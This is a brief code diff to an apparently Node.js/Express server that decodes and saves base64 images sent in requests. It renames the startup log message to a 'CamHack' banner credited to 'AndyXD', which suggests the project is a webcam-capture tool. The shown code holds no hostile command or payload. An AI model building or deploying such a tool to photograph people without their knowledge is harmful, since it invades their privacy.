@@ -34,5 +34,5 @@ const { imageType, fileName } = base64ToImage( decodeURIComponent(req.body.img),
 res.send(fileName);
 });
 app.listen(5000, () => {
-console.log("App Running on Port 5000!");
+console.log("𝐂𝐚𝐦𝐇𝐚𝐜𝐤 𝐑𝐮𝐧𝐧𝐢𝐧𝐠 𝐁𝐲 𝐀𝐧𝐝𝐲𝐗𝐃");
 });
